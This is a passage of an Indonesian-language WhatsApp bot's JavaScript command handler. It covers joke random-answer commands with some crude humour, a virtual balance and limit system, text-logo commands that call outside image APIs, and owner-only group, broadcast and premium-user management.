                const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi','20 Hari Lagi', '25 Hari Lagi','30 Hari Lagi','35 Hari Lagi','40 Hari Lagi','45 Hari Lagi','50 Hari Lagi','55 Hari Lagi','60 Hari Lagi','65 Hari Lagi','70 Hari Lagi','75 Hari Lagi','80 Hari Lagi','85 Hari Lagi','90 Hari Lagi','100 Hari Lagi','5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi','20 Bulan Lagi', '25 Bulan Lagi','30 Bulan Lagi','35 Bulan Lagi','40 Bulan Lagi','45 Bulan Lagi','50 Bulan Lagi','55 Bulan Lagi','60 Bulan Lagi','65 Bulan Lagi','70 Bulan Lagi','75 Bulan Lagi','80 Bulan Lagi','85 Bulan Lagi','90 Bulan Lagi','100 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','Besok','Lusa',`Abis Ini Juga Lu ${q}`]
                const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
                xnone.sendMessage(from, { text: `Pertanyaan : kapankah ${q}\nJawaban : *${kapankah}*` }, { quoted: msg })
                break
            case prefix+'bagaimanakah': case prefix+'gimanakah': case prefix+'gimana':
                if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} cara punya cewe`)
                const gimana = ['Ga Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','Astaghfirallah Beneran???','Pusing ah','Ooh Gitu','Yang Sabar Ya Bos','Gimana yeee']
                const ya = gimana[Math.floor(Math.random() * gimana.length)]
                xnone.sendMessage(from, { text: `Pertanyaan : bagaimanakah ${q}\nJawaban : ${ya}` }, { quoted: msg })
                break
            case prefix+'rate': case prefix+'nilai':
                if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} kebesaran titit sy`)
                const ra = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
                const te = ra[Math.floor(Math.random() * ra.length)]
                xnone.sendMessage(from, { text: `Rate : ${q}\nJawaban : *${te}%*` }, { quoted: msg })
                break
            case prefix+'gantengcek': case prefix+'cekganteng':
                if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Divaa`)
                const gan = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
                const teng = gan[Math.floor(Math.random() * gan.length)]
                xnone.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${teng}%*` }, { quoted: msg })
                break
           case prefix+'cantikcek': case prefix+'cekcantik':
                if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Fafa`)
                const can = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
                const tik = can[Math.floor(Math.random() * can.length)]
                xnone.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${tik}%*` }, { quoted: msg })
                break
           case prefix+'sangecek': case prefix+'ceksange': case prefix+'gaycek': case prefix+'cekgay': case prefix+'lesbicek': case prefix+'ceklesbi':
                if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
                const sangeh = ['5', '10', '15','20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
                const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
                xnone.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${sange}%*` }, { quoted: msg })
                break
            case prefix+'cekbapak':
                const bapak = ['Wah Mantap Lu Masih Punya Bapack\nPasti Bapack Nya Kuli :v\nAwowkwokwwok\n#CandabOs', 'Aowkwwo Disini Ada Yteam :v\nLu Yteam Bro? Awowkwowk\nSabar Bro Ga Punya Bapack\n#Camda', 'Bjir Bapack Mu Ternyata Sudah Cemrai\nSedih Bro Gua Liatnya\nTapi Nih Tapi :v\nTetep Ae Lu Yteam Aowkwowkw Ngakak :v', 'Jangan #cekbapak Mulu Broo :v\nKasian Yang Yteam\nNtar Tersinggung Kan\nYahahaha Hayyuk By : Divaa Cnci']
                const bapack = bapak[Math.floor(Math.random() * bapak.length)]
                xnone.sendMessage(from, { text: bapack }, { quoted: msg })
                break

           // Balance Menu
           case prefix+'limit': case prefix+'balance': case prefix+'ceklimit': case prefix+'cekbalance':
			    if (mentioned.length !== 0){
					var Ystatus = ownerNumber.includes(mentioned[0])
					var isPrim = Ystatus ? true : _prem.checkPremiumUser(mentioned[0], premium)
				    var ggcount = isPrim ? gcounti.prem : gcounti.user
                    var limitMen = `${getLimit(mentioned[0], limitCount, limit)}`
                    reply(`💳 Limit : ${_prem.checkPremiumUser(mentioned[0], premium) ? 'Unlimited' : limitMen}/${limitCount}\n🕹️ Limit Game : ${cekGLimit(mentioned[0], ggcount, glimit)}/${ggcount}\n🏦 Balance : $${getBalance(mentioned[0], balance)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit *jumlah* dan ${prefix}buyglimit *jumlah* untuk membeli game limit\n\n*Example :*\n${prefix}buylimit 1\n${prefix}buyglimit 1\n\n*Note :*\n• Harga 1 limit = $150 balance`)
                } else {
                    var limitPrib = `${getLimit(sender, limitCount, limit)}/${limitCount}`
                    reply(`💳 Limit : ${isPremium ? 'Unlimited' : limitPrib}\n🕹️ Limit Game : ${cekGLimit(sender, gcount, glimit)}/${gcount}\n🏦 Balance : $${getBalance(sender, balance)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit *jumlah* dan ${prefix}buyglimit *jumlah* untuk membeli game limit\n\n*Example :*\n${prefix}buylimit 1\n${prefix}buyglimit 1\n\n*Note :*\n• Harga 1 limit = $150 balance`)
                }
				break
            case prefix+'transfer':
            case prefix+'tf':{
                 if (args.length < 2) return reply(`Kirim perintah *${command}* @tag nominal\nContoh : ${command} @62895379169488 2000`)
                 if (mentioned.length == 0) return reply(`Tag orang yang ingin di transfer balance`)
                 if (!args[2]) return reply(`Masukkan nominal nya!`)
                 if (isNaN(args[2])) return reply(`Nominal harus berupa angka!`)
                 if (args[2].toLowerCase() === 'infinity') return reply(`Yahaha saya ndak bisa di tipu`)
                 if (args[2].includes("-")) return reply(`Jangan menggunakan -`)
                 var anu = getBalance(sender, balance)
                 if (anu < args[2] || anu == 'undefined') return reply(`Balance Kamu Tidak Mencukupi Untuk Transfer Sebesar $${args[2]}, Kumpulkan Terlebih Dahulu\nKetik ${prefix}balance, untuk mengecek Balance mu!`)
                 kurangBalance(sender, parseInt(args[2]), balance)
                 addBalance(mentioned[0], parseInt(args[2]), balance)
                 xnone.sendMessage(from, { text: `Success transfer balance sebesar $${args[2]} kepada @${mentioned[0].split("@")[0]}`, mentions: [mentioned[0]] }, { quoted: msg })
            }
                 break
            case prefix+'buylimit':{
                if (args.length < 2) return reply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = $150 balance`)
                if (args[1].includes('-')) return reply(`Jangan menggunakan -`)
                if (isNaN(args[1])) return reply(`Harus berupa angka`)
                if (args[1].toLowerCase() === 'infinity') return reply(`Yahaha saya ndak bisa di tipu`)
                let ane = Number(parseInt(args[1]) * 150)
                if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
                kurangBalance(sender, ane, balance)
                giveLimit(sender, parseInt(args[1]), limit)
                reply(monospace(`Pembeliaan limit sebanyak ${args[1]} berhasil\n\nSisa Balance : $${getBalance(sender, balance)}\nSisa Limit : ${getLimit(sender, limitCount, limit)}/${limitCount}`))
            }
                break
            case prefix+'buygamelimit':
            case prefix+'buyglimit':{
                if (args.length < 2) return reply(`Kirim perintah *${prefix}buyglimit* jumlah game limit yang ingin dibeli\n\nHarga 1 game limit = $150 balance\nPajak $1 / $10`)
                if (args[1].includes('-')) return reply(`Jangan menggunakan -`)
                if (isNaN(args[1])) return reply(`Harus berupa angka`)
                if (args[1].toLowerCase() === 'infinity') return reply(`Yahaha saya ndak bisa di tipu`)
                let ane = Number(parseInt(args[1]) * 150)
                if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
                kurangBalance(sender, ane, balance)
                givegame(sender, parseInt(args[1]), glimit)
                reply(monospace(`Pembeliaan game limit sebanyak ${args[1]} berhasil\n\nSisa Balance : $${getBalance(sender, balance)}\nSisa Game Limit : ${cekGLimit(sender, gcount, glimit)}/${gcount}`))
            }
                break
            case prefix+'topglobal':{
                balance.sort((a, b) => (a.balance < b.balance) ? 1 : -1)
                let top = '*── 「 TOPGLOBAL BALANCE 」 ──*\n\n'
                let arrTop = []
				var total = 10
				if (balance.length < 10) total = balance.length
                for (let i = 0; i < total; i ++){
                    top += `${i + 1}. @${balance[i].id.split("@")[0]}\n=> Balance : $${balance[i].balance}\n\n`
                    arrTop.push(balance[i].id)
                }
                mentions(top, arrTop, true)
                }
                break
            case prefix+'toplocal':{
                if (!isGroup)return reply(mess.OnlyGrup)
                balance.sort((a, b) => (a.balance < b.balance) ? 1 : -1)
                let top = '*── 「 TOPLOCAL BALANCE 」 ──*\n\n'
                let arrTop = []
                var total = 10
				if (balance.length < 10) total = balance.length
                let anggroup = groupMembers.map(a => a.id)
                for (let i = 0; i < total; i ++){
                    if (anggroup.includes(balance[i].id)) {
                        top += `${i + 1}. @${balance[i].id.split("@")[0]}\n=> Balance : $${balance[i].balance}\n\n`
                        arrTop.push(balance[i].id)
                    }
                }
                mentions(top, arrTop, true)
                }
                break

            // Maker Menu
            case prefix+'tahta': case prefix+'harta': case prefix+'hartatahta':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 1) return reply(`Penggunaan ${command} text\n\nContoh : ${command} Divaa Cnci`)
                var hata = await getBuffer(`https://api.lolhuman.xyz/api/hartatahta?apikey=${apikeys}&text=${q}`)
                var buttonsMaker = [
                { urlButton: { displayText: `Follows Sekarang !`, url : `${data.result}` } },
                { quickReplyButton: { displayText: `Back To Menu`, id: `${prefix}help` } },
                { quickReplyButton: { displayText: `Donate`, id: `${prefix}tos` } }
                ]
                xnone.sendMessage(from, { caption: `Success kak`, image: { url: hata }, templateButtons: buttonsMaker, footer: footxt, mentions: [sender] })
                limitAdd(sender, limit)
                break
            case prefix+'pornhub': case prefix+'grafity-text2': case prefix+'logo-wolf': case prefix+'logo-wolf2':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Penggunaan ${command} text1|text2\n\nContoh : ${command} Divaa|Cnci`)
                if (!q.includes("|")) return reply(`Penggunaan ${command} text1|text2\n\nContoh : ${command} Divaa|Cnci`)
                reply(mess.wait)
                var data = await fetchJson(`https://fadlyid.herokuapp.com/api/textpro/${command.slice(1)}?text=${q.split("|")[0]}&text2=${q.split("|")[1]}&apikey=jayo`)
                var buttonsMaker = [
                { urlButton: { displayText: `Source Code Image`, url : `${data.result}` } },
                { quickReplyButton: { displayText: `Back To Menu`, id: `${prefix}help` } },
                { quickReplyButton: { displayText: `Donate`, id: `${prefix}tos` } }
                ]
                xnone.sendMessage(from, { caption: `Success kak`, image: { url: `${data.result}` }, templateButtons: buttonsMaker, footer: footxt, mentions: [sender] })
                limitAdd(sender, limit)
                break
            case prefix+'grafity-text': case prefix+'black-pink': case prefix+'magma': case prefix+'neon-light': case prefix+'water-color': case prefix+'larva':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Penggunaan ${command} text1|text2\n\nContoh : ${command} Fadly`)
                var data = await fetchJson(`https://fadlyid.herokuapp.com/api/textpro/${command.slice(1)}?text=${q}&apikey=jayo`)
                var buttonsMaker = [
                { urlButton: { displayText: `Source Code Image`, url : `${data.result}` } },
                { quickReplyButton: { displayText: `Back To Menu`, id: `${prefix}help` } },
                { quickReplyButton: { displayText: `Donate`, id: `${prefix}tos` } }
                ]
                xnone.sendMessage(from, { caption: `Success kak`, image: { url: `${data.result}` }, templateButtons: buttonsMaker, footer: footxt, mentions: [sender] })
                limitAdd(sender, limit)
                break
                

            // Other Menu
            case prefix+'ssweb':
                if (args.length < 2) return reply(`Kirim Perintah ${command} link\nContoh ${command} https://xdlyy404.github.io`)
                if (!isUrl(args[1])) return reply(mess.error.Iv)
                var seweb = chats.slice(7)
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
  reply(mess.wait)
                xnone.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/sswebfull?apikey=${apikeys}&url=${seweb}`}})
                limitAdd(sender, limit)
                break
            case prefix+'kalkulator': case prefix+'k':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 1) return reply(`Kirim perintah ${command} hitungan\n\nPerkalian = *\nPembagian = /\nPenambahan = +\nPengurangan = -\n\n_Contoh : ${command} 10*10_`)
                var data = await fetchJson(`https://bx-hunter.herokuapp.com/api/calculator?angka=${q}&apikey=FuckBitch`)
                reply(data.result)
                limitAdd(sender, limit)
                break
            case prefix+'readmore': case prefix+'more':
                if (args.length < 2) return reply(`Kirim perintah ${command} text1|text2`)
                var read = q.split("|")
                var more2 = q.split("|")
                var retmor = `${read}${readmore}${more}`
                xnone.sendMessage(from, { text: retmor}, { quoted: msg })
                break
            case prefix+'tagme':
                let tagme = `@${sender.split("@")[0]} Sayang😘`
                mentions(tagme, [sender], true)
                break

            // Owners Menu
            case prefix+'join':
			    if (!isOwner) return reply(mess.OnlyOwner)
				if (args.length < 2) return reply(`Kirim perintah ${command} _linkgrup_`)
				if (!isUrl(args[1])) return reply(mess.error.Iv)
				var url = args[1]
			    url = url.split('https://chat.whatsapp.com/')[1]
				var data = await xnone.groupAcceptInvite(url)
				reply(jsonformat(data))
				break
            case prefix+'leave':
			    if (!isOwner) return reply(mess.OnlyOwner)
				if (!isGroup) return reply(mess.OnlyGrup)
				xnone.groupLeave(from)
			    break
            case prefix+'bc': case prefix+'broadcast': {
                if (!isOwner) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`Masukkan isi pesannya`)
                var data = await store.chats.all() //.map(v => v.id)
                reply(`Mengirim Broadcast`)
                for (let fadly of data) {
                    // xnone.sendMessage(i.id, { text: `${q}` })
                    await sleep(1500)
                    let bcnya = `${q}`
                    xnone.sendMessage(fadly.id, { caption: bcnya, image: fs.readFileSync(setting.pathImg), templateButtons: buttonsBc, footer: "BROADCAST", mentions: [fadly] })
                    }
                    reply('Success Sending Broadcast')
                 }
                 break
            case prefix+'self':{
                if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
                xnone.mode = 'self'
                reply('Berhasil berubah ke mode self')
                }
                break
            case prefix+'publik': case prefix+'public':{
                if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
                xnone.mode = 'public'
                reply('Berhasil berubah ke mode public')
                }
                break
            case prefix+'bc2':
                if (!isOwner) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`Masukkan isi pesannya`)
                var data = await store.chats.all()
                for (let i of data) {
                    xnone.sendMessage(i.id, { text: `${q}` })
                    await sleep(1000)
                }
                break
            case prefix+'setpp': case prefix+'setppbot':
		        if (!isOwner) return reply(mess.OnlyOwner)
		        if (isImage || isQuotedImage) {
				    var media = await downloadAndSaveMediaMessage('image', 'ppbot.jpeg')
				    var data =  await xnone.updateProfilePicture(botNumber, { url: media })
			        fs.unlinkSync(media)
				    reply(`Success`)
				} else {
				    reply(`Kirim/balas gambar dengan caption ${command} untuk mengubah foto profil bot`)
				}
				break
            case prefix+'exif':
                if (!isOwner) return reply(mess.OnlyOwner)
			    var namaPack = q.split('|')[0] ? q.split('|')[0] : q
                var authorPack = q.split('|')[1] ? q.split('|')[1] : ''
                exif.create(namaPack, authorPack)
                reply(`Success Banh`)
                break
            case prefix+'addprem': case prefix+'addpremium':
                if (!isOwner) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`Penggunaan :\n*${prefix}addprem* @tag waktu\n*${prefix}addprem* nomor waktu\n\nContoh : ${command} @tag 30d`)
                if (!args[2]) return reply(`Mau yang berapa hari?`)
                if (mentioned.length !== 0) {
                    _prem.addPremiumUser(mentioned[0], args[2], premium)
                    reply('Success')
                } else {
                    var cekap = await xnone.onWhatsApp(args[1]+"@s.whatsapp.net")
                    if (cekap.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
                    _prem.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], premium)
                    reply('Success')
                }
                break
            case prefix+'delprem': case prefix+'delpremium':
                if (!isOwner) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`Penggunaan :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`)
                if (mentioned.length !== 0){
                    premium.splice(_prem.getPremiumPosition(mentioned[0], premium), 1)
                    fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
                    reply('Success!')
                } else {
                 var cekpr = await xnone.oWhatsApp(args[1]+"@s.whatsapp.net")
                 if (cekpr.length == 0) return reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
                    premium.splice(_prem.getPremiumPosition(args[1] + '@s.whatsapp.net', premium), 1)
                    fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
                    reply('Success!')
                }
                break
        case prefix+'addsewa':
            if (!isOwner) return reply(mess.OnlyOwner)
            if (args.length < 2) return reply(`Penggunaan :\n*${prefix}addsewa* linkgc waktu`)
            if (!args[2]) return
            let ceh = await xnone.groupInviteCode(args[1].replace('https://chat.whatsapp.com/', ''))
            if (ceh.status === 200) {
                xnone.groupAcceptInvite(args[1].replace('https://chat.whatsapp.com/', ''))
                    .then((res) => {
                        _sewa.addSewaGroup(res.gid, args[2], sewa)
                        reply(`Success Add Sewa Group Berwaktu!`)
                    })
            } else {
                reply(`link salah`)
            }
            break
        case prefix+'delsewa':
            if (!isOwner) return reply(mess.OnlyOwner)
            if (args.length < 2) return reply(`Penggunaan :\n*${prefix}delprem* idgroup`)
            sewa.splice(_sewa.getSewaPosition(args[1], sewa), 1)
            fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa, null, 3))
            reply(`Sukses lur`)
            break
            case prefix+'resetlimit':
                if (!isOwner) return reply(mess.OnlyOwner)
                let ovb = []
                fs.writeFileSync('./database/limit.json', JSON.stringify(ovb, null, 2))
                fs.writeFileSync('./database/glimit.json', JSON.stringify(ovb, null, 2))
                reply(`Done`)
                break
            case prefix+'resetlist':
                if (!isOwner) return reply(mess.OnlyOwner)
                let ovj = []
                fs.writeFileSync('./database/list-message.json', JSON.stringify(ovj, null, 2))
                reply(`Done`)
                break
        case prefix+'setcmd':
            if (!isPremium) return reply(mess.OnlyPrem)
            if (!isQuotedSticker) return reply('Reply stickernya..')
            if (!q) return reply(`Masukan balasannya...\nContoh: ${prefix}setcmd #menu`)
            if (checkRespons(msg.quotedMsg.stickerMessage.fileSha256.toString('hex'), responDB) === true) return reply('Key hex tersebut sudah terdaftar di database!')
            addRespons(msg.quotedMsg.stickerMessage.fileSha256.toString('hex'), q, sender, responDB)
            reply(`• *Key:* ${msg.quotedMsg.stickerMessage.fileSha256.toString('hex')}\n• *Action:* ${q}\n\nBerhasil di set`)
            break
        case prefix+'delcmd':
            if (!isPremium) return reply(mess.OnlyPrem)
            if (!isQuotedSticker) return reply('Reply stickernya..')
            if (!deleteRespons(msg.quotedMsg.stickerMessage.fileSha256.toString('hex'), responDB)) return reply('Key hex tersebut tidak ada di database')
            deleteRespons(msg.quotedMsg.stickerMessage.fileSha256.toString('hex'), responDB)
            reply(`Berhasil remove key hex ${msg.quotedMsg.stickerMessage.fileSha256.toString('hex')}`)
            break

/*xnone.sendMessage(from, { text: 'tes', contextInfo:{externalAdReply:{title:"© Divaa Cnci", body:"© Divaa Cnci", mediaType:2, thumbnailUrl: fs.readFileSync("./media/x-none.jpg"), thumbnail: fs.readFileSync("./media/x-none.jpg"), mediaUrl: "https://youtu.be/jKAawPBWe5k"}}})*/

default:
}
	} catch (err) {
        console.log(color('[ERROR]', 'red'), err)
	}
}
